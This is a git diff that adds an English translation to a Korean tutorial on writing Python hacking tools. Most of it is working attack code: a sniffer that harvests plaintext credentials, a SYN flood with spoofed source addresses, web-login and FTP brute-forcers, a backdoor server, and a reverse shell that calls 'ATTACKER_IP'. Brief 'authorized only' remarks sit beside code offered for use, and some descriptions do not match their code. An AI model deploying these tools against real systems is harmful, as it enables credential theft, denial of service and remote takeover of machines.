@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 파이썬 해킹 도구 개발 — 실전 30가지 예제
 
 ## 1. 파이썬 기초 (해킹 관점)
@@ -1161,6 +1167,585 @@ def main() -> None:
     fw = PentestFramework(args.target)
     result = fw.run(phases)
     generate_report(result, args.output)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+<a name="english"></a>
+
+# Python Hacking Tool Development — 30 Practical Examples
+
+## 1. Python Basics (Hacking Perspective)
+
+### Module Structure
+
+The basic module structure for Python hacking tools. Separate classes and functions by functionality and configure a CLI interface using argparse.
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# Standard library
+import socket
+import os
+import sys
+import subprocess
+import threading
+import struct
+import time
+
+# Libraries commonly used in hacking tools
+# pip install requests scapy pwntools paramiko
+import requests
+from scapy.all import *
+from pwn import *
+import paramiko
+```
+
+### Class-Based Structure
+
+Define a `NetworkScanner` class. Encapsulate related state and behavior into a single object to improve reusability and maintainability.
+
+```python
+class NetworkScanner:
+    def __init__(self, target, port_range=(1, 1024)):
+        self.target = target
+        self.start_port, self.end_port = port_range
+        self.open_ports = []
+    
+    def scan_port(self, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((self.target, port))
+            if result == 0:
+                self.open_ports.append(port)
+            s.close()
+        except socket.error:
+            pass
+    
+    def run(self):
+        threads = []
+        for port in range(self.start_port, self.end_port + 1):
+            t = threading.Thread(target=self.scan_port, args=(port,))
+            threads.append(t)
+            t.start()
+        
+        for t in threads:
+            t.join()
+        
+        return sorted(self.open_ports)
+
+# Usage
+scanner = NetworkScanner("192.168.1.1", (1, 1024))
+print(scanner.run())
+```
+
+---
+
+## 2. Network Tools
+
+### Example 1: Port Scanner (nmap library)
+
+A multi-threaded port scanner using the Python `socket` library. It checks port availability via TCP connection attempts and uses `ThreadPoolExecutor` for parallel processing to increase scan speed.
+
+```python
+import nmap
+
+def port_scan(target, ports="1-1024"):
+    nm = nmap.PortScanner()
+    nm.scan(target, ports)
+    
+    for host in nm.all_hosts():
+        print(f"Host: {host} ({nm[host].hostname()})")
+        print(f"State: {nm[host].state()}")
+        
+        for proto in nm[host].all_protocols():
+            print(f"Protocol: {proto}")
+            port_list = sorted(nm[host][proto].keys())
+            
+            for port in port_list:
+                state = nm[host][proto][port]['state']
+                service = nm[host][proto][port].get('name', 'unknown')
+                version = nm[host][proto][port].get('version', '')
+                print(f"  {port}/{proto} {state} {service} {version}")
+
+port_scan("192.168.1.0/24", "22,80,443,3306,8080")
+```
+
+### Example 2: TCP Port Scanner (Sockets)
+
+A multi-threaded port scanner using the Python `socket` library. It checks port availability via TCP connection attempts and uses `ThreadPoolExecutor` for parallel processing to increase scan speed.
+
+```python
+import socket
+import threading
+from queue import Queue
+
+def scan_worker(q, results, lock):
+    while not q.empty():
+        host, port = q.get()
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            if s.connect_ex((host, port)) == 0:
+                try:
+                    banner = s.recv(1024).decode(errors='ignore').strip()
+                except:
+                    banner = ""
+                with lock:
+                    results.append((port, banner))
+            s.close()
+        except:
+            pass
+        finally:
+            q.task_done()
+
+def fast_port_scan(host, ports=range(1, 10001), threads=200):
+    q = Queue()
+    results = []
+    lock = threading.Lock()
+    
+    for port in ports:
+        q.put((host, port))
+    
+    for _ in range(min(threads, len(ports))):
+        t = threading.Thread(target=scan_worker, args=(q, results, lock))
+        t.daemon = True
+        t.start()
+    
+    q.join()
+    return sorted(results)
+
+# Run
+print(f"[*] Scanning 192.168.1.1...")
+open_ports = fast_port_scan("192.168.1.1", range(1, 1025))
+for port, banner in open_ports:
+    print(f"[+] Port {port} OPEN" + (f" | {banner[:50]}" if banner else ""))
+```
+
+### Example 3: Packet Sniffer (Plaintext Credential Theft)
+
+A sniffer that receives network packets via sockets and detects plaintext credentials. It captures login information from unencrypted protocols such as HTTP, FTP, and Telnet.
+
+```python
+import socket
+import string
+
+def packet_sniffer():
+    HOST = socket.gethostbyname(socket.gethostname())
+    
+    # Raw socket (requires admin privileges)
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+    s.bind((HOST, 0))
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  # Windows
+    
+    keywords = ["USER", "PASS", "password", "login", "230 User logged in"]
+    
+    print("[*] Sniffing started... (Ctrl+C to stop)")
+    while True:
+        try:
+            data = s.recvfrom(65565)
+            raw = data[0]
+            
+            # Parse printable characters only
+            printable = set(string.printable)
+            parsed = ''.join(chr(b) if chr(b) in printable else '.' 
+                           for b in raw)
+            
+            for keyword in keywords:
+                if keyword in parsed:
+                    print(f"\n[!] Found keyword '{keyword}':")
+                    print(parsed[:200])
+                    break
+        except KeyboardInterrupt:
+            break
+    
+    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
+    s.close()
+
+packet_sniffer()
+```
+
+### Example 4: TCP SYN Flood (DoS Attack — For Learning and Defense Understanding)
+
+Implements the TCP SYN Flood DoS attack principle in Python. Sends a large volume of SYN packets via raw sockets to exhaust the target server's connection queue.
+
+```python
+import socket
+import struct
+import random
+
+def calculate_checksum(data):
+    """Calculate checksum"""
+    s = 0
+    for i in range(0, len(data), 2):
+        if i + 1 < len(data):
+            w = (data[i] << 8) + data[i + 1]
+        else:
+            w = data[i] << 8
+        s += w
+    s = (s >> 16) + (s & 0xffff)
+    s = ~s & 0xffff
+    return s
+
+def create_ip_header(src_ip, dst_ip):
+    """Create IP header"""
+    version_ihl = (4 << 4) + 5
+    tos = 0
+    total_length = 40
+    id = random.randint(0, 65535)
+    flags_offset = 0
+    ttl = 64
+    protocol = socket.IPPROTO_TCP
+    checksum = 0
+    src = socket.inet_aton(src_ip)
+    dst = socket.inet_aton(dst_ip)
+    
+    header = struct.pack('!BBHHHBBH4s4s',
+                        version_ihl, tos, total_length, id, flags_offset,
+                        ttl, protocol, checksum, src, dst)
+    return header
+
+def create_tcp_header(src_port, dst_port, src_ip, dst_ip):
+    """Create TCP SYN header"""
+    seq = random.randint(0, 2**32 - 1)
+    ack = 0
+    data_offset = (5 << 4)
+    flags = 0x02  # SYN flag
+    window = socket.htons(29200)
+    checksum = 0
+    urgent = 0
+    
+    # Compute actual checksum with placeholder
+    tcp_header = struct.pack('!HHLLBBHHH',
+                            src_port, dst_port, seq, ack,
+                            data_offset, flags, window, checksum, urgent)
+    
+    # Pseudo header (for checksum calculation)
+    src = socket.inet_aton(src_ip)
+    dst = socket.inet_aton(dst_ip)
+    pseudo = struct.pack('!4s4sBBH', src, dst, 0, socket.IPPROTO_TCP, len(tcp_header))
+    
+    checksum = calculate_checksum(pseudo + tcp_header)
+    
+    tcp_header = struct.pack('!HHLLBBHHH',
+                            src_port, dst_port, seq, ack,
+                            data_offset, flags, window, checksum, urgent)
+    return tcp_header
+
+# For learning purposes: do NOT use for actual attacks
+def syn_flood_demo(dst_ip, dst_port=80, count=10):
+    """SYN Flood demo (authorized environments only)"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    
+    for i in range(count):
+        # Random source IP (IP spoofing)
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        
+        ip_header  = create_ip_header(src_ip, dst_ip)
+        tcp_header = create_tcp_header(src_port, dst_port, src_ip, dst_ip)
+        
+        packet = ip_header + tcp_header
+        s.sendto(packet, (dst_ip, 0))
+        print(f"[{i+1}] Sent SYN from {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
+    
+    s.close()
+```
+
+---
+
+## 3. Web Hacking Automation
+
+### Example 5: Web Login Cracker (Dictionary Attack)
+
+An online brute-force script that tries each password candidate from a dictionary file. It sends POST requests to a login form using the `requests` library and determines success based on the response.
+
+```python
+import requests
+
+def web_login_crack(target_url, username, wordlist_path):
+    """Web login dictionary attack (authorized systems only)"""
+    
+    session = requests.Session()
+    
+    # Redirect URL on successful login (verify in advance)
+    success_indicator = "dashboard"  # Keyword present on success
+    
+    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+        for line in f:
+            password = line.strip()
+            
+            payload = {
+                'username': username,
+                'password': password,
+                'submit': 'Login'
+            }
+            
+            try:
+                response = session.post(target_url, data=payload, 
+                                       timeout=5, allow_redirects=True)
+                
+                if success_indicator in response.url or \
+                   success_indicator in response.text:
+                    print(f"[+] SUCCESS! Password: {password}")
+                    return password
+                else:
+                    print(f"[-] Failed: {password}")
+            
+            except requests.exceptions.RequestException as e:
+                print(f"[!] Error: {e}")
+                continue
+    
+    print("[-] Password not found in wordlist")
+    return None
+```
+
+---
+
+## 4. Backdoors and Reverse Shells
+
+### Example 8: Backdoor Server (on target machine)
+
+Backdoor server code that allows remote command execution. Runs on the target machine and returns results for attacker commands.
+
+```python
+# backdoor_server.py (run on target machine)
+from socket import *
+
+def backdoor_server(host='', port=11443):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+    s.bind((host, port))
+    s.listen(10)
+    
+    print(f"[*] Listening on port {port}...")
+    
+    conn, addr = s.accept()
+    print(f"[*] Connected from {addr}")
+    
+    while True:
+        command = input("Enter command: ")
+        conn.send(command.encode())
+        
+        if command.lower() == "quit":
+            break
+        
+        response = conn.recv(4096).decode()
+        print(response)
+    
+    conn.close()
+    s.close()
+
+backdoor_server()
+```
+
+### Example 10: Python Reverse Shell (one-liner)
+
+A reverse shell implemented in Python. When run on the target machine, it attempts to connect to the attacker's listener and opens a command execution channel.
+
+```python
+# Reverse shell (run on target machine)
+# Attacker machine: nc -lvnp 4444
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("ATTACKER_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+```
+
+---
+
+## 5. FTP Cracking (Multi-threaded)
+
+### Example 11: FTP Brute-forcer
+
+Performs brute-force attacks against FTP services using ftplib. Tries each password in a wordlist to find valid credentials.
+
+```python
+import ftplib
+import threading
+from queue import Queue
+
+class FTPCracker:
+    def __init__(self, host, user, wordlist, threads=10):
+        self.host = host
+        self.user = user
+        self.wordlist = wordlist
+        self.threads = threads
+        self.found = False
+        self.password = None
+        self.q = Queue()
+    
+    def try_login(self, password):
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(self.host, 21, timeout=5)
+            ftp.login(self.user, password)
+            ftp.quit()
+            return True
+        except ftplib.error_perm:
+            return False
+        except Exception:
+            return False
+    
+    def worker(self):
+        while not self.q.empty() and not self.found:
+            password = self.q.get()
+            
+            if self.try_login(password):
+                self.found = True
+                self.password = password
+                print(f"[+] SUCCESS! {self.user}:{password}")
+            else:
+                print(f"[-] {password}")
+            
+            self.q.task_done()
+    
+    def run(self):
+        with open(self.wordlist, 'r', errors='ignore') as f:
+            for line in f:
+                self.q.put(line.strip())
+        
+        thread_list = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        self.q.join()
+        return self.password
+```
+
+---
+
+## 9. Encryption/Decryption
+
+### Example 17: XOR Encryption (Simple Obfuscation)
+
+Implements XOR encryption in Python. A simple obfuscation technique commonly used in malware for detection evasion.
+
+```python
+def xor_encrypt(data, key):
+    """XOR encryption/decryption (same key for reverse operation)"""
+    if isinstance(data, str):
+        data = data.encode()
+    if isinstance(key, str):
+        key = key.encode()
+    
+    return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])
+
+def xor_decrypt(encrypted, key):
+    """XOR decryption (same as encryption)"""
+    return xor_encrypt(encrypted, key)
+
+# Usage
+plaintext = "Hello, World! This is secret."
+key = "secretkey"
+
+encrypted = xor_encrypt(plaintext, key)
+print(f"Encrypted: {encrypted.hex()}")
+
+decrypted = xor_decrypt(encrypted, key).decode()
+print(f"Decrypted: {decrypted}")
+```
+
+---
+
+## 10. Integrated Hacking Framework Structure
+
+An integrated framework structure combining multiple hacking capabilities. Reconnaissance, exploit, and post-exploitation modules can be extended in a plugin-style manner.
+
+```python
+#!/usr/bin/env python3
+"""
+Penetration Testing Automation Framework (Python 3.10+)
+Purpose: Structured pipeline of recon -> scan -> vulnerability analysis -> report generation
+Usage: python3 pentest_framework.py <target> [--phase recon|scan|all]
+Dependencies: pip install requests dnspython
+"""
+from __future__ import annotations
+import argparse
+import json
+import socket
+import sys
+import threading
+from collections import defaultdict
+from dataclasses import dataclass, field, asdict
+from datetime import datetime
+from pathlib import Path
+from queue import Queue
+from typing import Callable
+
+
+# --- Data Models ---
+
+@dataclass
+class Finding:
+    phase: str
+    severity: str    # CRITICAL / HIGH / MEDIUM / LOW / INFO
+    title: str
+    detail: str
+    evidence: str = ""
+
+    def __str__(self) -> str:
+        return f"[{self.severity:8s}] {self.title}: {self.detail}"
+
+
+@dataclass
+class EngagementResult:
+    target: str
+    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
+    end_time: str = ""
+    open_ports: list[tuple[int, str]] = field(default_factory=list)
+    dns_records: dict[str, list[str]] = field(default_factory=dict)
+    findings: list[Finding] = field(default_factory=list)
+
+    def add_finding(self, *args, **kwargs) -> None:
+        self.findings.append(Finding(*args, **kwargs))
+
+    def summary(self) -> dict:
+        counts: dict[str, int] = defaultdict(int)
+        for f in self.findings:
+            counts[f.severity] += 1
+        return dict(counts)
+
+
+class PentestFramework:
+    def __init__(self, target: str) -> None:
+        self.target = target
+        self.result = EngagementResult(target=target)
+
+    def run(self, phases: list[str] = ("recon", "scan")) -> EngagementResult:
+        print(f"[*] Target: {self.target}")
+        # ... phase execution logic
+        return self.result
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Penetration Testing Automation Framework")
+    parser.add_argument("target", help="Target hostname or IP")
+    parser.add_argument(
+        "--phase", nargs="+",
+        choices=["recon", "scan", "all"], default=["all"],
+        help="Phases to execute (default: all)",
+    )
+    parser.add_argument("--output", default="pentest_report.json", help="Report file path")
+    args = parser.parse_args()
+
+    phases = ["recon", "scan"] if "all" in args.phase else args.phase
+    fw = PentestFramework(args.target)
+    result = fw.run(phases)
 
 
 if __name__ == "__main__":
